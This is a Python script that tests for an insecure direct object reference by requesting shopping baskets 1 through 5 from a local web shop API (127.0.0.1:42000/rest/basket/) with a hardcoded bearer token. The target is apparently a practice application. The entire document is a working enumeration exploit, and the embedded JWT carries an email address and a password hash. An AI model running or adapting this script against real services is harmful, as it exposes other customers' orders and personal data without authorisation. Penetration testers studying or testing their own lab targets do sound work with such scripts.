import requests

token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJodXlAZ21haWwuY29tIiwicGFzc3dvcmQiOiJlMTBhZGMzOTQ5YmE1OWFiYmU1NmUwNTdmMjBmODgzZSIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDYtMTIgMDI6MDE6MTkuODc0ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDYtMTIgMDI6MDE6MTkuODc0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc0OTY5MzY4N30.LV2dmbryNqBRp7kYfU8Cq2AjyrSxt1NpsAUeMFBTp0Asg-3w6Vta0ZQ1Df26j0bRqmvOEJVqD8AgVGnyvSBPAJEgOsLxrQuTkZXHwUb4aavXitiDCGTwWy7VacwrIValFRwrBc1gAvrB6n9JZS_DJace7s8a13BGcCpGC_hAd6k'

for basket_id in range(1, 6): 
    url = f'http://127.0.0.1:42000/rest/basket/{basket_id}'
    headers = {
        'Authorization': f'Bearer {token}'
    }
    resp = requests.get(url, headers=headers)
    print(f"[i] Testing basketId={basket_id}")
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text}\n")

    if resp.status_code == 200 and 'Products' in resp.text:
        print(f"[+] Success: Possible IDOR! Accessed basketId={basket_id}\n")
    else:
        print(f"[-] Not accessible or empty for basketId={basket_id}\n")
